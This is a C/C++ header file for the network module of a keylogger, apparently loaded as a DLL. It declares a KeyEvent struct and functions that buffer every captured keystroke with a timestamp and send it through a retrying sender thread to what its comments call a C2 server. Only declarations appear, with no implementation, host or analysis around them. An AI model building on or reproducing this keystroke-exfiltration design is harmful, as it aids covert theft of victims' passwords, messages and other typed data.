#pragma once

#include <Windows.h>

// Key event stored in the ring buffer
typedef struct {
    SYSTEMTIME captureTime;  // Timestamp at key-press time
    int vkCode;              // Virtual key code
} KeyEvent;

// Initialize the network module
// Reads config, caches hostname, connects to C2, starts sender thread
// Returns true even if connection fails (sender thread retries)
bool InitNetwork(HMODULE hDllModule);

// Buffer a key event for network transmission
// Captures current timestamp and adds to ring buffer
void BufferKeyEvent(int vkCode);

// Cleanup the network module
// Signals sender thread to stop, performs final flush, closes socket
void CleanupNetwork();

// Check if network module is initialized
bool IsNetworkReady();
